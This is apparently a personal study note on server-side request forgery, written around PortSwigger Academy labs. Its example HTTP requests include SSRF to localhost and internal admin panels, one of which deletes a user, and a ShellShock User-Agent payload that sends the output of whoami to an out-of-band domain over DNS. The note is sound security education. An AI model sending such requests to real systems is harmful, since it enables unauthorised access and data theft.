Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.

## SSRF attacks against the server itself

In an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface.

Main point of intrests:
- Pages accessible only from localhost (like administrative panels)
- Services on other ports

>[!example]
>Original request:
>```http
>POST /product/stock HTTP/1.0
>Content-Type: application/x-www-form-urlencoded
>Content-Length: 118
>
>stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1>
>```
>
> Malicious request:
> ```http
> POST /product/stock HTTP/1.0
>Content-Type: application/x-www-form-urlencoded
>Content-Length: 118
>
>stockApi=http://localhost/admin
>```

## SSRF attacks against other servers

SSRF against other servers often arises when the application server is able to interact with other back-end systems that are not directly reachable by users. 
These systems often have non-routable private IP addresses and often have a weaker security posture. In many cases, they contain sensitive functionality often accessibile  without authentication.

>[!example]
>Request against an internal, non-routed, administrative panel:
>
>```http
>POST /product/stock HTTP/1.1
Host: 0ae400fb040404ddc56df732005a00ae.web-security-academy.net
Cookie: session=jQGNv9ozVPtY2SdltFQVanHUn7mzqQsk
Content-Length: 73
Connection: close
>
>stockApi=http://192.168.0.100:8080/admin/delete?username=carlos&storeId=1
>```

## Blind SSRF

Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.

Blind SSRF can be found using [OAST](https://portswigger.net/burp/application-security-testing/oast) techniques.

>[!note]
>It is common when testing for SSRF vulnerabilities to observe a DNS look-up for the supplied Collaborator domain, but no subsequent HTTP request. This typically happens because the application attempted to make an HTTP request to the domain, which caused the initial DNS lookup, but the actual HTTP request was blocked by network-level filtering. It is relatively common for infrastructure to allow outbound DNS traffic, since this is needed for so many purposes, but block HTTP connections to unexpected destinations.

Identifying a blind SSRF vulnerability that can trigger out-of-band HTTP requests doesn't in itself provide a route to exploitability. However, it can still be leveraged to probe for other vulnerabilities on the server itself or on other back-end systems. You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities. If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server.

Another avenue for exploiting blind SSRF vulnerabilities is to induce the application to connect to a system under the attacker's control, and return malicious responses to the HTTP client that makes the connection. If you can exploit a serious client-side vulnerability in the server's HTTP implementation, you might be able to achieve remote code execution within the application infrastructure. [^1]

[^1]: https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient

>[!example] Exploit a blind SSRF to exfiltrate usernames from targets vulnerable to ShellShock
>```http
GET /product?productId=1 HTTP/1.1
Host: 0a240091041ee9e2c2e8e317006a00a4.web-security-academy.net
Cookie: session=N0jjt4vE0NGhsIgr52oW9MFtvlSuBLv2
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).cp5wj8xh4c0qaefd19tzdw6dh4nvbuzj.oastify.com
Referer: http://192.168.0.§0§:8080/
Connection: close
>```

## Other attack surface

- Partial URLs in requests (eg. only a hostname or part of a URL path into request parameters)
- URLs within data formats (eg. XML leading to SSRF using [XML External Entity Injection (XXE Injection)](XML%20External%20Entity%20Injection%20(XXE%20Injection).md))
- Referer header or other headers ([Host header SSRF attacks (aka Routing-based SSRF)](Host%20Header%20attacks.md#Host%20header%20SSRF%20attacks%20(aka%20Routing-based%20SSRF)))
- [SSRF registering an arbitrary OpenID Connect client application](OpenID%20Connect%20attacks.md#SSRF%20registering%20an%20arbitrary%20client%20application)

## SSRF evasion and bypasses

- [Evading Restrictions](Evading%20Restrictions.md)
- [A New Era of SSRF](https://portswigger.net/research/top-10-web-hacking-techniques-of-2017#1)

## External resources

- [HackTrick (SSRF)](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [Targeting auxiliary systems](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#aux)